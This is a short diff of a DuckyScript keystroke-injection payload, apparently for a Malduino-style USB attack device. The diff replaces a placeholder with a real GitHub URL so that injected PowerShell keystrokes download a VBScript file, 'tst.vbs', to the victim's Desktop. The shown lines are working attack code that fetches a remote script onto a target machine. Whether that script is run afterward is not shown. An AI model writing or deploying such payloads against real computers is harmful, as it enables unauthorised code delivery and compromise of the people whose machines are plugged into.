@@ -13,7 +13,7 @@ STRING $c = new-object System.Net.WebClient
 DELAY 10
 ENTER
 DELAY 1000
-STRING $c.DownloadFile("FILLIN",".\Desktop\tst.vbs")
+STRING $c.DownloadFile("https://raw.githubusercontent.com/meatball084/malduinowStuff/main/tst.vbs",".\Desktop\tst.vbs")
 DELAY 100
 ENTER
 DELAY 1000
